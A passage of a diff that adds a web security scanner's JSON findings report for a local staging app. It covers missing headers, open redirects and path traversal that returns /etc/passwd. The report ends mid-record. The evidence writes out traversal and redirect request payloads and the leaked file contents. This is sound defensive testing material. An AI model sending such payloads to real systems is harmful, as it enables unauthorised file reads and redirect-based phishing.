@@ -1,0 +1,1161 @@
+{
+  "application": "acme-orders",
+  "environment": "staging-local",
+  "target": "http://127.0.0.1:18080",
+  "timestamp": "2026-10-03T00:53:34.899956+03:00",
+  "findings": [
+    {
+      "id": "MANTIS-HEADER-STRICT_TRANSPORT_SECURITY",
+      "name": "Missing Strict-Transport-Security header",
+      "severity": "medium",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "",
+      "method": "GET",
+      "description": "Response is missing the Strict-Transport-Security header, allowing downgrade to plaintext HTTP on future visits.",
+      "cwe": "CWE-319",
+      "owasp": "A05:2021-Security Misconfiguration",
+      "tags": [
+        "passive",
+        "dast"
+      ],
+      "evidence": {
+        "description": "Response is missing the Strict-Transport-Security header, allowing downgrade to plaintext HTTP on future visits.",
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080",
+            "status_code": 404,
+            "response_headers": {
+              "Content-Length": "0",
+              "Date": "Fri, 02 Oct 2026 21:53:26 GMT",
+              "Server": "Kestrel"
+            },
+            "duration_ms": 4
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:27.002981+03:00"
+    },
+    {
+      "id": "MANTIS-HEADER-X_CONTENT_TYPE_OPTIONS",
+      "name": "Missing X-Content-Type-Options header",
+      "severity": "low",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "",
+      "method": "GET",
+      "description": "Response is missing X-Content-Type-Options: nosniff, allowing browsers to MIME-sniff content types.",
+      "cwe": "CWE-116",
+      "owasp": "A05:2021-Security Misconfiguration",
+      "tags": [
+        "passive",
+        "dast"
+      ],
+      "evidence": {
+        "description": "Response is missing X-Content-Type-Options: nosniff, allowing browsers to MIME-sniff content types.",
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080",
+            "status_code": 404,
+            "response_headers": {
+              "Content-Length": "0",
+              "Date": "Fri, 02 Oct 2026 21:53:26 GMT",
+              "Server": "Kestrel"
+            },
+            "duration_ms": 4
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:27.002984+03:00"
+    },
+    {
+      "id": "MANTIS-HEADER-X_FRAME_OPTIONS",
+      "name": "Missing X-Frame-Options header",
+      "severity": "medium",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "",
+      "method": "GET",
+      "description": "Response is missing X-Frame-Options and may be missing an equivalent Content-Security-Policy frame-ancestors directive, allowing clickjacking.",
+      "cwe": "CWE-1021",
+      "owasp": "A05:2021-Security Misconfiguration",
+      "tags": [
+        "passive",
+        "dast"
+      ],
+      "evidence": {
+        "description": "Response is missing X-Frame-Options and may be missing an equivalent Content-Security-Policy frame-ancestors directive, allowing clickjacking.",
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080",
+            "status_code": 404,
+            "response_headers": {
+              "Content-Length": "0",
+              "Date": "Fri, 02 Oct 2026 21:53:26 GMT",
+              "Server": "Kestrel"
+            },
+            "duration_ms": 4
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:27.002986+03:00"
+    },
+    {
+      "id": "MANTIS-HEADER-CONTENT_SECURITY_POLICY",
+      "name": "Missing Content-Security-Policy header",
+      "severity": "medium",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "",
+      "method": "GET",
+      "description": "Response is missing a Content-Security-Policy header.",
+      "cwe": "CWE-693",
+      "owasp": "A05:2021-Security Misconfiguration",
+      "tags": [
+        "passive",
+        "dast"
+      ],
+      "evidence": {
+        "description": "Response is missing a Content-Security-Policy header.",
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080",
+            "status_code": 404,
+            "response_headers": {
+              "Content-Length": "0",
+              "Date": "Fri, 02 Oct 2026 21:53:26 GMT",
+              "Server": "Kestrel"
+            },
+            "duration_ms": 4
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:27.002989+03:00"
+    },
+    {
+      "id": "MANTIS-HEADER-REFERRER_POLICY",
+      "name": "Missing Referrer-Policy header",
+      "severity": "low",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "",
+      "method": "GET",
+      "description": "Response is missing a Referrer-Policy header, which may leak URLs via the Referer header on outbound links.",
+      "cwe": "CWE-200",
+      "owasp": "A05:2021-Security Misconfiguration",
+      "tags": [
+        "passive",
+        "dast"
+      ],
+      "evidence": {
+        "description": "Response is missing a Referrer-Policy header, which may leak URLs via the Referer header on outbound links.",
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080",
+            "status_code": 404,
+            "response_headers": {
+              "Content-Length": "0",
+              "Date": "Fri, 02 Oct 2026 21:53:26 GMT",
+              "Server": "Kestrel"
+            },
+            "duration_ms": 4
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:27.00299+03:00"
+    },
+    {
+      "id": "MANTIS-HEADER-PERMISSIONS_POLICY",
+      "name": "Missing Permissions-Policy header",
+      "severity": "info",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "",
+      "method": "GET",
+      "description": "The response is missing a Permissions-Policy header. Without it, the page grants the browser's default feature access (camera, microphone, geolocation, etc.) to any embedded frame or script.",
+      "cwe": "CWE-693",
+      "owasp": "A05:2021-Security Misconfiguration",
+      "tags": [
+        "passive",
+        "dast"
+      ],
+      "evidence": {
+        "description": "The response is missing a Permissions-Policy header. Without it, the page grants the browser's default feature access (camera, microphone, geolocation, etc.) to any embedded frame or script.",
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080",
+            "status_code": 404,
+            "response_headers": {
+              "Content-Length": "0",
+              "Date": "Fri, 02 Oct 2026 21:53:26 GMT",
+              "Server": "Kestrel"
+            },
+            "duration_ms": 4
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:27.002994+03:00"
+    },
+    {
+      "id": "acme-open-redirect",
+      "name": "Open Redirect to an external host",
+      "severity": "medium",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "/account/signed-in?returnUrl=http%3A%2F%2Flocalhost%3A18090%2Fwitness-landing",
+      "method": "GET",
+      "template": "acme-open-redirect",
+      "description": "A redirect parameter sent the client to an external landing host. Mantis follows redirects, so detection matches the landing page content.",
+      "remediation": "Only redirect to local paths (Url.IsLocalUrl / LocalRedirect) or an allowlist.",
+      "cwe": "CWE-601",
+      "owasp": "A01:2021-Broken Access Control",
+      "tags": [
+        "redirect"
+      ],
+      "evidence": {
+        "description": "Template matched, indicating the condition it tests for is present.",
+        "matched_on": [
+          "witness-landing-marker"
+        ],
+        "extracted_vars": {
+          "BaseURL": "http://127.0.0.1:18080"
+        },
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/account/signed-in?returnUrl=http%3A%2F%2Flocalhost%3A18090%2Fwitness-landing",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "23",
+              "Content-Type": "application/octet-stream",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Last-Modified": "Fri, 02 Oct 2026 21:53:09 GMT",
+              "Server": "SimpleHTTP/0.6 Python/3.14.7"
+            },
+            "response_body": "witness-landing-marker\n",
+            "duration_ms": 25
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:27.124123+03:00"
+    },
+    {
+      "id": "acme-open-redirect",
+      "name": "Open Redirect to an external host",
+      "severity": "medium",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "/account/switch?returnUrl=%2F\u0026next=http%3A%2F%2Flocalhost%3A18090%2Fwitness-landing",
+      "method": "GET",
+      "template": "acme-open-redirect",
+      "description": "A redirect parameter sent the client to an external landing host. Mantis follows redirects, so detection matches the landing page content.",
+      "remediation": "Only redirect to local paths (Url.IsLocalUrl / LocalRedirect) or an allowlist.",
+      "cwe": "CWE-601",
+      "owasp": "A01:2021-Broken Access Control",
+      "tags": [
+        "redirect"
+      ],
+      "evidence": {
+        "description": "Template matched, indicating the condition it tests for is present.",
+        "matched_on": [
+          "witness-landing-marker"
+        ],
+        "extracted_vars": {
+          "BaseURL": "http://127.0.0.1:18080"
+        },
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/account/signed-in?returnUrl=http%3A%2F%2Flocalhost%3A18090%2Fwitness-landing",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "23",
+              "Content-Type": "application/octet-stream",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Last-Modified": "Fri, 02 Oct 2026 21:53:09 GMT",
+              "Server": "SimpleHTTP/0.6 Python/3.14.7"
+            },
+            "response_body": "witness-landing-marker\n",
+            "duration_ms": 25
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/account/continue?returnUrl=http%3A%2F%2Flocalhost%3A18090%2Fwitness-landing",
+            "status_code": 404,
+            "response_headers": {
+              "Content-Length": "0",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "duration_ms": 4
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/account/switch?returnUrl=%2F\u0026next=http%3A%2F%2Flocalhost%3A18090%2Fwitness-landing",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "23",
+              "Content-Type": "application/octet-stream",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Last-Modified": "Fri, 02 Oct 2026 21:53:09 GMT",
+              "Server": "SimpleHTTP/0.6 Python/3.14.7"
+            },
+            "response_body": "witness-landing-marker\n",
+            "duration_ms": 6
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:27.30541+03:00"
+    },
+    {
+      "id": "acme-open-redirect",
+      "name": "Open Redirect to an external host",
+      "severity": "medium",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "/account/signed-out?returnUrl=%2F%2Flocalhost%3A18090%2Fwitness-landing",
+      "method": "GET",
+      "template": "acme-open-redirect",
+      "description": "A redirect parameter sent the client to an external landing host. Mantis follows redirects, so detection matches the landing page content.",
+      "remediation": "Only redirect to local paths (Url.IsLocalUrl / LocalRedirect) or an allowlist.",
+      "cwe": "CWE-601",
+      "owasp": "A01:2021-Broken Access Control",
+      "tags": [
+        "redirect"
+      ],
+      "evidence": {
+        "description": "Template matched, indicating the condition it tests for is present.",
+        "matched_on": [
+          "witness-landing-marker"
+        ],
+        "extracted_vars": {
+          "BaseURL": "http://127.0.0.1:18080"
+        },
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/account/signed-in?returnUrl=http%3A%2F%2Flocalhost%3A18090%2Fwitness-landing",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "23",
+              "Content-Type": "application/octet-stream",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Last-Modified": "Fri, 02 Oct 2026 21:53:09 GMT",
+              "Server": "SimpleHTTP/0.6 Python/3.14.7"
+            },
+            "response_body": "witness-landing-marker\n",
+            "duration_ms": 25
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/account/continue?returnUrl=http%3A%2F%2Flocalhost%3A18090%2Fwitness-landing",
+            "status_code": 404,
+            "response_headers": {
+              "Content-Length": "0",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "duration_ms": 4
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/account/switch?returnUrl=%2F\u0026next=http%3A%2F%2Flocalhost%3A18090%2Fwitness-landing",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "23",
+              "Content-Type": "application/octet-stream",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Last-Modified": "Fri, 02 Oct 2026 21:53:09 GMT",
+              "Server": "SimpleHTTP/0.6 Python/3.14.7"
+            },
+            "response_body": "witness-landing-marker\n",
+            "duration_ms": 6
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/account/signed-out?returnUrl=%2F%2Flocalhost%3A18090%2Fwitness-landing",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "23",
+              "Content-Type": "application/octet-stream",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Last-Modified": "Fri, 02 Oct 2026 21:53:09 GMT",
+              "Server": "SimpleHTTP/0.6 Python/3.14.7"
+            },
+            "response_body": "witness-landing-marker\n",
+            "duration_ms": 5
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:27.404174+03:00"
+    },
+    {
+      "id": "acme-open-redirect",
+      "name": "Open Redirect to an external host",
+      "severity": "medium",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "/links/out?next=http%3A%2F%2Flocalhost%3A18090%2Fwitness-landing",
+      "method": "GET",
+      "template": "acme-open-redirect",
+      "description": "A redirect parameter sent the client to an external landing host. Mantis follows redirects, so detection matches the landing page content.",
+      "remediation": "Only redirect to local paths (Url.IsLocalUrl / LocalRedirect) or an allowlist.",
+      "cwe": "CWE-601",
+      "owasp": "A01:2021-Broken Access Control",
+      "tags": [
+        "redirect"
+      ],
+      "evidence": {
+        "description": "Template matched, indicating the condition it tests for is present.",
+        "matched_on": [
+          "witness-landing-marker"
+        ],
+        "extracted_vars": {
+          "BaseURL": "http://127.0.0.1:18080"
+        },
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/account/signed-in?returnUrl=http%3A%2F%2Flocalhost%3A18090%2Fwitness-landing",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "23",
+              "Content-Type": "application/octet-stream",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Last-Modified": "Fri, 02 Oct 2026 21:53:09 GMT",
+              "Server": "SimpleHTTP/0.6 Python/3.14.7"
+            },
+            "response_body": "witness-landing-marker\n",
+            "duration_ms": 25
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/account/continue?returnUrl=http%3A%2F%2Flocalhost%3A18090%2Fwitness-landing",
+            "status_code": 404,
+            "response_headers": {
+              "Content-Length": "0",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "duration_ms": 4
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/account/switch?returnUrl=%2F\u0026next=http%3A%2F%2Flocalhost%3A18090%2Fwitness-landing",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "23",
+              "Content-Type": "application/octet-stream",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Last-Modified": "Fri, 02 Oct 2026 21:53:09 GMT",
+              "Server": "SimpleHTTP/0.6 Python/3.14.7"
+            },
+            "response_body": "witness-landing-marker\n",
+            "duration_ms": 6
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/account/signed-out?returnUrl=%2F%2Flocalhost%3A18090%2Fwitness-landing",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "23",
+              "Content-Type": "application/octet-stream",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Last-Modified": "Fri, 02 Oct 2026 21:53:09 GMT",
+              "Server": "SimpleHTTP/0.6 Python/3.14.7"
+            },
+            "response_body": "witness-landing-marker\n",
+            "duration_ms": 5
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/links/out?next=http%3A%2F%2Flocalhost%3A18090%2Fwitness-landing",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "23",
+              "Content-Type": "application/octet-stream",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Last-Modified": "Fri, 02 Oct 2026 21:53:09 GMT",
+              "Server": "SimpleHTTP/0.6 Python/3.14.7"
+            },
+            "response_body": "witness-landing-marker\n",
+            "duration_ms": 3
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:27.501239+03:00"
+    },
+    {
+      "id": "acme-path-traversal",
+      "name": "Path Traversal in document name",
+      "severity": "critical",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "/api/documents/raw?name=..%2F..%2F..%2Fetc%2Fpasswd",
+      "method": "GET",
+      "template": "acme-path-traversal",
+      "description": "A ../ sequence in a document name returned /etc/passwd.",
+      "remediation": "Reduce names with Path.GetFileName or normalize with Path.GetFullPath and verify the result stays under the document root.",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021-Broken Access Control",
+      "tags": [
+        "traversal",
+        "lfi"
+      ],
+      "evidence": {
+        "description": "Template matched, indicating the condition it tests for is present.",
+        "matched_on": [
+          "root:.*:0:0:"
+        ],
+        "extracted_vars": {
+          "BaseURL": "http://127.0.0.1:18080"
+        },
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/raw?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "923",
+              "Content-Type": "text/plain",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\napp:x:1654:1654::/home/app:/bin/sh\n",
+            "duration_ms": 5
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:27.60422+03:00"
+    },
+    {
+      "id": "acme-path-traversal",
+      "name": "Path Traversal in document name",
+      "severity": "critical",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "/api/documents/legacy?name=..%2F..%2F..%2Fetc%2Fpasswd",
+      "method": "GET",
+      "template": "acme-path-traversal",
+      "description": "A ../ sequence in a document name returned /etc/passwd.",
+      "remediation": "Reduce names with Path.GetFileName or normalize with Path.GetFullPath and verify the result stays under the document root.",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021-Broken Access Control",
+      "tags": [
+        "traversal",
+        "lfi"
+      ],
+      "evidence": {
+        "description": "Template matched, indicating the condition it tests for is present.",
+        "matched_on": [
+          "root:.*:0:0:"
+        ],
+        "extracted_vars": {
+          "BaseURL": "http://127.0.0.1:18080"
+        },
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/raw?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "923",
+              "Content-Type": "text/plain",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\napp:x:1654:1654::/home/app:/bin/sh\n",
+            "duration_ms": 5
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/preview?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 500,
+            "response_headers": {
+              "Content-Length": "0",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "duration_ms": 11
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/view?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 400,
+            "response_headers": {
+              "Content-Type": "application/problem+json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "{\"type\":\"https://tools.ietf.org/html/rfc9110#section-15.5.1\",\"title\":\"Bad Request\",\"status\":400,\"traceId\":\"00-a1eedf6d7350cba6d6c06ccc7f527667-cf467ad63dee49b4-00\"}",
+            "duration_ms": 18
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/legacy?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "923",
+              "Content-Type": "text/plain",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\napp:x:1654:1654::/home/app:/bin/sh\n",
+            "duration_ms": 3
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:27.903154+03:00"
+    },
+    {
+      "id": "acme-path-traversal",
+      "name": "Path Traversal in document name",
+      "severity": "critical",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "/api/documents/download?name=..%2F..%2F..%2Fetc%2Fpasswd",
+      "method": "GET",
+      "template": "acme-path-traversal",
+      "description": "A ../ sequence in a document name returned /etc/passwd.",
+      "remediation": "Reduce names with Path.GetFileName or normalize with Path.GetFullPath and verify the result stays under the document root.",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021-Broken Access Control",
+      "tags": [
+        "traversal",
+        "lfi"
+      ],
+      "evidence": {
+        "description": "Template matched, indicating the condition it tests for is present.",
+        "matched_on": [
+          "root:.*:0:0:"
+        ],
+        "extracted_vars": {
+          "BaseURL": "http://127.0.0.1:18080"
+        },
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/raw?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "923",
+              "Content-Type": "text/plain",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\napp:x:1654:1654::/home/app:/bin/sh\n",
+            "duration_ms": 5
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/preview?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 500,
+            "response_headers": {
+              "Content-Length": "0",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "duration_ms": 11
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/view?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 400,
+            "response_headers": {
+              "Content-Type": "application/problem+json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "{\"type\":\"https://tools.ietf.org/html/rfc9110#section-15.5.1\",\"title\":\"Bad Request\",\"status\":400,\"traceId\":\"00-a1eedf6d7350cba6d6c06ccc7f527667-cf467ad63dee49b4-00\"}",
+            "duration_ms": 18
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/legacy?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "923",
+              "Content-Type": "text/plain",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\napp:x:1654:1654::/home/app:/bin/sh\n",
+            "duration_ms": 3
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/download?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "923",
+              "Content-Type": "application/octet-stream",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Last-Modified": "Fri, 02 Oct 2026 18:59:09 GMT",
+              "Server": "Kestrel"
+            },
